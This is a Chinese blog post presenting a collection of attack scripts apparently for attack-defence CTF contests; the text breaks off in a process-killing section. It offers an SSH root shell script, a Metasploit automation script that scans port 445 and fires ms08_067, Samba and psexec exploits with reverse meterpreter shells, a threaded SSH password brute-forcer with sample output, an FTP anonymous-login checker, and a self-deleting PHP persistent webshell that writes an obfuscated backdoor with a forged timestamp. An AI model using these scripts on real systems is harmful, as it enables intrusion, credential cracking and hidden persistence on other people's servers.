
 <!DOCTYPE HTML>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
  
    <title>竞赛中常用的脚本 | D&#39;Blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="D">
    

    
    <meta name="description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
<meta name="keywords" content="竞赛,脚本">
<meta property="og:type" content="article">
<meta property="og:title" content="竞赛中常用的脚本">
<meta property="og:url" content="http://blog.wangluomingong.top/2018/08/28/竞赛中常用的脚本/index.html">
<meta property="og:site_name" content="D&#39;Blog">
<meta property="og:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-05-17T09:24:44.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="竞赛中常用的脚本">
<meta name="twitter:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负">

    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>
</html>
  <body>
    <header>
      
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/08/28/竞赛中常用的脚本/" title="竞赛中常用的脚本" itemprop="url">竞赛中常用的脚本</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="D" target="_blank" itemprop="author">D</a>
		
  </p><p class="article-time">
    <time datetime="2018-08-27T16:00:00.000Z" itemprop="datePublished"> Published 2018-08-28</time>
    
  </p>
</header>
	<div class="article-content">
		
		<html><body style="padding: 20px;"><marquee><span style="font-weight: bolder;font-size: 20px;color: red;"><a href="https://www.youtube.com/channel/UCiO_qNDegcpV4cUhkFc22lA?view_as=subscriber" target="_blank" rel="noopener"><font color="red">声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负</font></a></span></marquee></body></html>

<a id="more"></a>

<h2 id="ssh连接脚本"><a href="#ssh连接脚本" class="headerlink" title="ssh连接脚本"></a>ssh连接脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"> </span><br><span class="line"><span class="comment">#SSH连接成功时的命令行交互窗口中前面的提示字符的集合</span></span><br><span class="line">PROMPT = [<span class="string">'# '</span>,<span class="string">'&gt;&gt;&gt; '</span>,<span class="string">'&gt; '</span>,<span class="string">'\$ '</span>]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_command</span><span class="params">(child,cmd)</span>:</span></span><br><span class="line">    <span class="comment">#发送一条命令</span></span><br><span class="line">    child.sendline(cmd)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#期望有命令行提示字符出现</span></span><br><span class="line">    <span class="comment">#child.expect(PROMPT)</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">#将之前的内容都输出</span></span><br><span class="line">    <span class="keyword">print</span> child.before</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(user,host,password)</span>:</span></span><br><span class="line">    <span class="comment">#表示主机已使用一个新的公钥的消息</span></span><br><span class="line">    ssh_newkey = <span class="string">'Are you sure you want to continue connecting'</span></span><br><span class="line">    connStr = <span class="string">'ssh '</span> + user + <span class="string">'@'</span> + host</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#为ssh命令生成一个spawn类的对象</span></span><br><span class="line">    child = pexpect.spawn(connStr)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#期望有ssh_newkey字符、提示输入密码的字符出现，否则超时</span></span><br><span class="line">    ret = child.expect([pexpect.TIMEOUT,ssh_newkey,<span class="string">'[P|p]assword: '</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment">#匹配到超时TIMEOUT</span></span><br><span class="line">    <span class="keyword">if</span> ret == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[-] Error Connecting'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment">#匹配到ssh_newkey</span></span><br><span class="line">    <span class="keyword">if</span> ret == <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#发送yes回应ssh_newkey并期望提示输入密码的字符出现</span></span><br><span class="line">        child.sendline(<span class="string">'yes'</span>)</span><br><span class="line">        ret = child.expect([pexpect.TIMEOUT,<span class="string">'[P|p]assword: '</span>])</span><br><span class="line">    <span class="comment">#匹配到超时TIMEOUT</span></span><br><span class="line">    <span class="keyword">if</span> ret == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[-] Error Connecting'</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment">#发送密码</span></span><br><span class="line">    child.sendline(password)</span><br><span class="line">    child.expect(PROMPT)    </span><br><span class="line">    <span class="keyword">return</span> child</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    host=<span class="string">'172.24.10.231'</span></span><br><span class="line">    user=<span class="string">'root'</span></span><br><span class="line">    password=<span class="string">'123456'</span></span><br><span class="line">    child=connect(user,host,password)</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        cmd = raw_input(<span class="string">"#"</span>)</span><br><span class="line">        send_command(child,cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">执行：</span><br><span class="line">$ python2 ssh2.py </span><br><span class="line"><span class="comment">#ls</span></span><br><span class="line">ls</span><br><span class="line">anaconda-ks.cfg  Documents  install.log         Music     Public     Videos</span><br><span class="line">Desktop          Downloads  install.log.syslog  Pictures  Templates</span><br><span class="line">[root@localhost ~]</span><br><span class="line"><span class="comment">#id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure>

<h2 id="python与msf交互脚本"><a href="#python与msf交互脚本" class="headerlink" title="python与msf交互脚本"></a>python与msf交互脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#python与msf交互</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> nmap</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findTarget</span><span class="params">(Hosts)</span>:</span>              <span class="comment">#扫描网段范围内开放445端口的主机</span></span><br><span class="line">    nmScan=nmap.PortScanner()</span><br><span class="line">    nmScan.scan(Hosts,<span class="string">'445'</span>)</span><br><span class="line">    targets=[]</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> nmScan.all_hosts():</span><br><span class="line">        <span class="keyword">if</span> nmScan[t].has_tcp(<span class="number">445</span>):  <span class="comment">#如果445端口提供了协议</span></span><br><span class="line">            state=nmScan[t][<span class="string">'tcp'</span>][<span class="number">445</span>][<span class="string">'state'</span>]  <span class="comment">#查看445端口的状态</span></span><br><span class="line">            <span class="keyword">if</span> state==<span class="string">'open'</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[+]Found Target Host:'</span>+t</span><br><span class="line">                targets.append(t) </span><br><span class="line">    <span class="keyword">return</span> targets         <span class="comment">#返回开放445端口的主机列表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setupHandler</span><span class="params">(configFile,lhost,lport)</span>:</span>               <span class="comment">#监听被攻击的主机</span></span><br><span class="line">    configFile.write(<span class="string">'use exploit/multi/handler\n'</span>)     <span class="comment">#使用</span></span><br><span class="line">    configFile.write(<span class="string">'set PAYLOAD windows/meterpreter/reverse_tcp \n'</span>)  <span class="comment">#设定payload载荷</span></span><br><span class="line">    configFile.write(<span class="string">'set LPORT '</span>+str(lport)+<span class="string">'\n'</span>)      <span class="comment">#设置监听的端口</span></span><br><span class="line">    configFile.write(<span class="string">'set LHOST '</span>+lhost+<span class="string">'\n'</span>)           <span class="comment">#设置监听的主机，也就是我们的主机</span></span><br><span class="line">    configFile.write(<span class="string">'set DisablePayloadHandler 1\n'</span>)  <span class="comment">#不重新监听</span></span><br><span class="line">    configFile.write(<span class="string">'exploit  -j  -z\n'</span>)                 <span class="comment">#监听  j选项是将所有连接的会话保持在后台 -z不与任务进行即时交换</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_pipename</span><span class="params">(configFile,target,lhost,lport)</span>:</span>       <span class="comment">#漏洞利用</span></span><br><span class="line">    configFile.write(<span class="string">'use exploit/linux/samba/is_known_pipename\n'</span>)  <span class="comment">#漏洞利用代码</span></span><br><span class="line">    configFile.write(<span class="string">'set RHOST '</span>+str(target)+<span class="string">'\n'</span>)              <span class="comment">#设定参数</span></span><br><span class="line">    configFile.write(<span class="string">'set LHOST '</span>+lhost+<span class="string">'\n'</span>)</span><br><span class="line">    configFile.write(<span class="string">'exploit \n'</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confickerExploit</span><span class="params">(configFile,target,lhost,lport)</span>:</span>       <span class="comment">#漏洞利用</span></span><br><span class="line">    configFile.write(<span class="string">'use exploit/windows/smb/ms08_067_netapi\n'</span>)  <span class="comment">#漏洞利用代码</span></span><br><span class="line">    configFile.write(<span class="string">'set PAYLOAD windows/meterpreter/reverse_tcp\n'</span>)</span><br><span class="line">    configFile.write(<span class="string">'set RHOST '</span>+str(target)+<span class="string">'\n'</span>)              <span class="comment">#设定参数</span></span><br><span class="line">    configFile.write(<span class="string">'set LPORT '</span>+str(lport)+<span class="string">'\n'</span>)</span><br><span class="line">    configFile.write(<span class="string">'set LHOST '</span>+lhost+<span class="string">'\n'</span>)</span><br><span class="line">    configFile.write(<span class="string">'exploit \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">smbBrute</span><span class="params">(configFile,target,passwdFile,lhost,lport)</span>:</span>          <span class="comment">#暴力破解SMB口令</span></span><br><span class="line">    username=<span class="string">'Administrator'</span></span><br><span class="line">    pF=open(passwordFile,<span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> pF.readlines():</span><br><span class="line">        password=password.strip(<span class="string">'\n'</span>)</span><br><span class="line">        configFile.write(<span class="string">'use exploit/windows/smb/psexec\n'</span>)</span><br><span class="line">        configFile.write(<span class="string">'set SMBUser '</span>+str(username)+<span class="string">'\n'</span>)</span><br><span class="line">        configFile.write(<span class="string">'set SMBPass '</span>+str(password)+<span class="string">'\n'</span>)</span><br><span class="line">        configFile.write(<span class="string">'set RHOST '</span>+str(target)+<span class="string">'\n'</span>)</span><br><span class="line">        configFile.write(<span class="string">'set PAYLOAD windows/meterpreter/reverse_tcp\n'</span>)</span><br><span class="line">        configFile.write(<span class="string">'set LPORT '</span>+str(lport)+<span class="string">'\n'</span>)</span><br><span class="line">        configFile.write(<span class="string">'set LHOST '</span>+lhost+<span class="string">'\n'</span>)</span><br><span class="line">        configFile.write(<span class="string">'exploit -j -z\n'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    configFile=open(<span class="string">'meta.rc'</span>,<span class="string">'w'</span>)  <span class="comment">#以写入方式打开配置文件</span></span><br><span class="line">    usage=<span class="string">'[-]Usage %prog -H &lt;RHOSTS&gt; -l/-L &lt;LHOST&gt; [-p/-P &lt;LPORT&gt; -F/-f &lt;password File&gt;]'</span></span><br><span class="line">    parser=optparse.OptionParser(usage)</span><br><span class="line">    parser.add_option(<span class="string">'-H'</span>,dest=<span class="string">'target'</span>,type=<span class="string">'string'</span>,help=<span class="string">'target host'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-p'</span>,<span class="string">'-P'</span>,dest=<span class="string">'lport'</span>,type=<span class="string">'string'</span>,help=<span class="string">'listen port'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-l'</span>,<span class="string">'-L'</span>,dest=<span class="string">'lhost'</span>,type=<span class="string">'string'</span>,help=<span class="string">'listen address'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-F'</span>,<span class="string">'-f'</span>,dest=<span class="string">'passwdFile'</span>,type=<span class="string">'string'</span>,help=<span class="string">'password file'</span>)</span><br><span class="line">    (options,args)=parser.parse_args()</span><br><span class="line">    passwdFile=options.passwdFile</span><br><span class="line">    target=options.target</span><br><span class="line">    lport=options.lport</span><br><span class="line">    lhost=options.lhost</span><br><span class="line">    <span class="keyword">if</span> (target==<span class="literal">None</span>)|(lhost==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">print</span> parser.usage</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> options.lport==<span class="literal">None</span>:</span><br><span class="line">        lport==<span class="string">'2333'</span></span><br><span class="line">    targets=findTarget(options.target)           <span class="comment">#寻找目标</span></span><br><span class="line">    setupHandler(configFile,lhost,lport)         <span class="comment">#设置配置文件</span></span><br><span class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> targets:                       <span class="comment">#逐个攻击</span></span><br><span class="line">        test_pipename(configFile,target,lhost,lport)</span><br><span class="line">        confickerExploit(configFile,target,lhost,lport)</span><br><span class="line">        <span class="keyword">if</span> passwdFile!=<span class="literal">None</span>:</span><br><span class="line">            smbBrute(configFile,target,passwdFile,lhost,lport)</span><br><span class="line">        configFile.close()</span><br><span class="line">        os.system(<span class="string">'msfconsole -r meta.rc'</span>)  <span class="comment">#启动metasploit并读取配置文件</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><a href="https://youtu.be/1It1WqZqbKA" target="_blank" rel="noopener">演示视频</a></p>
<h2 id="ssh爆破脚本"><a href="#ssh爆破脚本" class="headerlink" title="ssh爆破脚本"></a>ssh爆破脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pexpect <span class="keyword">import</span> pxssh</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">maxConnections = <span class="number">5</span></span><br><span class="line">connection_lock = threading.BoundedSemaphore(maxConnections)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_command</span><span class="params">(child,cmd)</span>:</span></span><br><span class="line">    child.sendline(cmd)</span><br><span class="line">    child.prompt()</span><br><span class="line">    print(child.before)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(host,user,password)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = pxssh.pxssh()</span><br><span class="line">        session.login(host,user,password)</span><br><span class="line">        print(<span class="string">'[+]Password Found:'</span>+password)</span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'[-] Error Connecting:'</span>+str(e))</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        connection_lock.release()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    parse = optparse.OptionParser(<span class="string">'Usage %prog '</span>+ \</span><br><span class="line">        <span class="string">'-H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;'</span>)</span><br><span class="line">    parse.add_option(<span class="string">'-H'</span>,dest=<span class="string">'host'</span>,type=<span class="string">'string'</span>,help=<span class="string">'specify target host'</span>)</span><br><span class="line">    parse.add_option(<span class="string">'-u'</span>,dest=<span class="string">'user'</span>,type=<span class="string">'string'</span>,help=<span class="string">'specify username'</span>)</span><br><span class="line">    parse.add_option(<span class="string">'-F'</span>,dest=<span class="string">'password'</span>,type=<span class="string">'string'</span>,help=<span class="string">'specify password file'</span>)</span><br><span class="line">    (options,args) = parse.parse_args()</span><br><span class="line"></span><br><span class="line">    host = options.host</span><br><span class="line">    user = options.user</span><br><span class="line">    password = options.password</span><br><span class="line"></span><br><span class="line">    password_file = open(password,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> password_file:</span><br><span class="line">        password = line.strip(<span class="string">'\r'</span>).strip(<span class="string">'\n'</span>)</span><br><span class="line">        connection_lock.acquire()</span><br><span class="line">        print(<span class="string">'[-] Testing password:'</span>+str(password))</span><br><span class="line">        thread = threading.Thread(target=connect,args=(host,user,password))</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">duwentaos-MacBook-Pro:Desktop duwentao$ python sshb.py -H 172.24.10.231 -u root -F 1.txt </span><br><span class="line">[-] Testing password:ls</span><br><span class="line">[-] Testing password:123456</span><br><span class="line">[+]Password Found:123456</span><br><span class="line">[-] Error Connecting:password refused</span><br><span class="line">duwentaos-MacBook-Pro:Desktop duwentao$</span><br></pre></td></tr></table></figure>

<h2 id="ftp匿名登陆"><a href="#ftp匿名登陆" class="headerlink" title="ftp匿名登陆"></a>ftp匿名登陆</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#Python中默认安装的ftplib模块定义了FTP类，其中函数有限，可用来实现简单的ftp客户端，用于上传或下载文件</span></span><br><span class="line"><span class="keyword">import</span> ftplib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">anonLogin</span><span class="params">(hostname)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#设置变量</span></span><br><span class="line">        ftp = ftplib.FTP(hostname)</span><br><span class="line">        <span class="comment">#ftp.login("user","password") 连接的用户名，密码</span></span><br><span class="line">        ftp.login(<span class="string">'anonymous'</span>, <span class="string">'what'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n[*] '</span> + str(hostname) + <span class="string">' FTP Anonymous Logon Succeeded.'</span></span><br><span class="line">        <span class="comment">#退出ftp</span></span><br><span class="line">        ftp.quit()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n[-] '</span> + str(hostname) + <span class="string">' FTP Anonymous Logon Failed.'</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        hostname = raw_input(<span class="string">"Please enter the hostname: "</span>)</span><br><span class="line">        anonLogin(hostname)</span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="php不死马"><a href="#php不死马" class="headerlink" title="php不死马"></a>php不死马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="string">'./.config.php'</span>, <span class="string">'&lt;?php @$_="s"."s"./*-/*-*/"e"./*-/*-*/"r"; @$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";  @$_/*-/*-*/($/*-/*-*/&#123;"_P"./*-/*-*/"OS"./*-/*-*/"T"&#125;[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?&gt;'</span>);</span><br><span class="line">        </span><br><span class="line">		system(<span class="string">'chmod 777 .config.php'</span>);</span><br><span class="line">        touch(<span class="string">"./.config.php"</span>, mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>));		</span><br><span class="line">        usleep(<span class="number">10000000</span>);	</span><br><span class="line">	&#125;		 </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="杀进程"><a href="#杀进程" class="headerlink" title="杀进程"></a>杀进程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 